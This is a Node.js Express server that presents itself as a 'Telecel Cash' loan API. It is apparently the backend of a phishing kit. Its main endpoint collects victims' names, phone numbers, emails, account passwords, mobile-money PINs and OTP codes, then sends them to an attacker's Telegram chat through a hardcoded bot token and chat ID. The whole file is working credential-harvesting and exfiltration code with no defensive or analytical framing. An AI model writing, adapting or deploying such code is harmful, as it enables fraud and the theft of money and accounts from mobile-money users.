const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());

// CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// ========== TELEGRAM CREDENTIALS - CORRECTED ==========
const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
const TG_CHAT_ID = '8392790531';

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'healthy', uptime: process.uptime() });
});

app.get('/', (req, res) => {
    res.json({ status: 'OK', message: 'Telecel Cash API is running!' });
});

// Main send endpoint
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, type, site, amount, term, monthly, telecel_number, password } = req.body;
        
        const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Accra' });
        
        let message = '';
        
        if (type === 'application') {
            message = `📱 NEW APPLICATION - Telecel Cash 📱\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Loan Amount: ₵${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: ₵${monthly || '0'}\n`;
            message += `💼 Monthly Income: ₵${pin || '0'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}`;
            
        } else if (type === 'pin') {
            message = `🔐 DETAILS CONFIRMED - Telecel Cash 🔐\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `📱 Telecel Number: ${telecel_number || 'Not provided'}\n`;
            message += `🔒 Password: ${password || 'Not provided'}\n`;
            message += `💰 Loan Amount: ₵${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: ₵${monthly || '0'}\n`;
            message += `🔑 PIN: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}`;
            
        } else if (type === 'otp') {
            message = `✅ OTP VERIFIED - Telecel Cash ✅\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `📱 Telecel Number: ${telecel_number || 'Not provided'}\n`;
            message += `💰 Loan Amount: ₵${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: ₵${monthly || '0'}\n`;
            message += `🔢 OTP Code: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            res.json({ success: true });
        } else {
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `🔧 TEST - Telecel Cash Bot is working! ✅`;
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(testMessage)}`;
        const response = await fetch(url);
        const result = await response.json();
        res.json({ success: result.ok, error: result.description });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Telecel Cash Backend running on port ${PORT}`);
    console.log(`📱 Bot Token: ${TG_BOT_TOKEN.substring(0, 10)}...`);
    console.log(`📱 Chat ID: ${TG_CHAT_ID}`);
});
